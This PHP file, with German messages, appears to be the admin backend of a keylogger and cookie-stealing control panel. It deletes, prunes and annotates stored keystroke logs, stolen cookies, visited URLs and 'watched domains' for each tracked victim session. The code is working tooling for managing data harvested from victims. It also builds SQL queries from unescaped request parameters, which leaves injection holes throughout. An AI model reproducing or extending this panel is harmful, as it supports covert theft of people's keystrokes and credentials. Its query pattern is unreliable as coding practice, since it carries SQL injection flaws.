<?php

if(isset($_GET["delete"]) && strlen($_GET["delete"]) >= 26){
	$session = $_GET["delete"];
	mysqli_query($con, "DELETE FROM user WHERE session = '".$session."'");
	echo "<div class=\"note\">Die Session \"".$session."\" wurde aus der Datenbank entfernt.</div><br />";
}

if(isset($_GET["clean"]) && strlen($_GET["clean"]) >= 26){
	$session = $_GET["clean"];
	//$victim = mysql_query("SELECT * FROM user WHERE session = '".$session."' ORDER BY time DESC LIMIT 1")
	$clean = mysqli_query($con, "SELECT * FROM user WHERE session = '".$session."' ORDER BY time DESC LIMIT 1");
	$time = mysqli_fetch_object($clean)->time;
	mysqli_query($con, "DELETE FROM user WHERE session = '".$session."' AND time < ".$time);
	echo "<div class=\"note\">Die Session \"".$session."\" wurde in der Datenbank aufger&auml;umt.</div><br />";
	mysqli_free_result($clean);
}

if(isset($_GET["keydel"]) && strlen($_GET["keydel"]) >= 26){
	$session = $_GET["keydel"];
	$time = $_GET["time"];
	$mintime = time()-$time;
	if($time == "all"){
		mysqli_query($con, "DELETE FROM keylogger WHERE session = '".$session."'");
	}
	else{
		mysqli_query($con, "DELETE FROM keylogger WHERE session = '".$session."' AND time < ".$mintime);
	}
	echo "<div class=\"note\">Eintr&auml;ge &auml;lter als ".sec2hms($time)." h:m:s wurden aus dem Keylog der Session \"".$session."\" gel&ouml;scht.</div><br />";
}

if(isset($_GET["domtoggle"]) && strlen($_GET["domtoggle"]) > 3 && isset($_GET["detail"]) && strlen($_GET["detail"]) >= 26){
	$session = $_GET["detail"];
	$domain = urldecode($_GET["domtoggle"]);
	$status = mysqli_query($con, "SELECT * FROM domain_watch WHERE session = '".$session."' AND domain = '".mysqli_real_escape_string($con, $domain)."' LIMIT 1");

	if(mysqli_num_rows($status) == 1){
		mysqli_query($con, "DELETE FROM domain_watch WHERE session = '".$session."' AND domain = '".$domain."'");
		echo "<div class=\"redbg note\">Die Beobachtung der Domain \"".$domain."\" wurde aufgehoben.</div><br />";
	}
	else{
		mysqli_query($con, "INSERT INTO domain_watch (domain, time, session) VALUES('".$domain."', '".time()."', '".$session."')");
		echo "<div class=\"note\">Die Beobachtung der Domain \"".$domain."\" wurde aktiviert.</div><br />";
	}
}

if(isset($_GET["urldel"]) && strlen($_GET["urldel"]) >= 26){
	$session = $_GET["urldel"];
	$time = $_GET["time"];
	$mintime = time()-$time;
	if($time == "all"){
		mysqli_query($con, "DELETE FROM location WHERE session = '".$session."'");
	}
	else{
		mysqli_query($con, "DELETE FROM location WHERE session = '".$session."' AND time < ".$mintime);
	}
	echo "<div class=\"note\">Eintr&auml;ge &auml;lter als ".sec2hms($time)." h:m:s wurden aus dem URL-Log der Session \"".$session."\" gel&ouml;scht.</div><br />";
}

if(isset($_GET["cookiedel"]) && strlen($_GET["cookiedel"]) >= 26){
	$session = $_GET["cookiedel"];
	$time = $_GET["time"];
	$mintime = time()-$time;
	if($time == "all"){
		mysqli_query($con, "DELETE FROM cookies WHERE session = '".$session."'");
	}
	else{
		mysqli_query($con, "DELETE FROM cookies WHERE session = '".$session."' AND time < ".$mintime);
	}
	echo "<div class=\"note\">Eintr&auml;ge &auml;lter als ".sec2hms($time)." h:m:s wurden aus dem URL-Log der Session \"".$session."\" gel&ouml;scht.</div><br />";
}

if(isset($_GET["deletedata"]) && isset($_GET["detail"]) && strlen($_GET["detail"]) >= 26){
	$session = $_GET["detail"];
	$del = $_GET["deletedata"];
	if($del == "all"){
		mysqli_query($con, "DELETE FROM data WHERE session = '".$session."'");
		echo "<div class=\"note\">Alle Eintr&auml;ge wurden gel&ouml;scht.</div><br />";
	}
	else if($del == "old"){
		$del = mysqli_query($con, "SELECT * FROM data WHERE session = '".$session."' ORDER BY id DESC") or die(mysqli_error($con));
		if(mysqli_num_rows($del) > 1){
			$maxid = mysqli_fetch_object($del)->id;
			mysqli_query($con, "DELETE FROM data WHERE session = '".$session."' AND id < ".$maxid) or die(mysqli_error($con));
			echo "<div class=\"note\">Alle alten Eintr&auml;ge wurden gel&ouml;scht.</div><br />";
		}
		else{
			echo "<div class=\"redbg note\">Es existiert nur ein Eintrag.</div><br />";
		}
		mysqli_free_result($del);
	}
	else{
		$id = (int)$del;
		mysqli_query($con, "DELETE FROM data WHERE session = '".$session."' AND id = ".$id);
		echo "<div class=\"note\">Eintrag wurde gel&ouml;scht.</div><br />";
	}
}

if(isset($_POST["text"]) && isset($_GET["detail"]) && strlen($_GET["detail"]) >= 26){
	$session = $_GET["detail"];
	if(isset($_POST["text"])){
		$text = mysqli_real_escape_string($con, $_POST["text"]);
		if(strlen($text) == 0){
			mysqli_query($con, "DELETE FROM comments WHERE session = '".$session."'");
			echo "<div class=\"redbg note\">Die Kommentare zur Session \"".$session."\" wurden gel&ouml;scht!</div><br />";
		}
		else{
			mysqli_query($con, "INSERT INTO comments (time, session, comment) VALUES('".time()."', '".$session."', '".$text."')");
			echo "<div class=\"note\">Der Kommentar zur Session \"".$session."\" wurde gespeichert.</div><br />";
		}
	}
	else
		echo "<div class=\"redbg note\">Der Kommentar zur Session \"".$session."\" wurde nicht gespeichert!</div><br />";
}
?>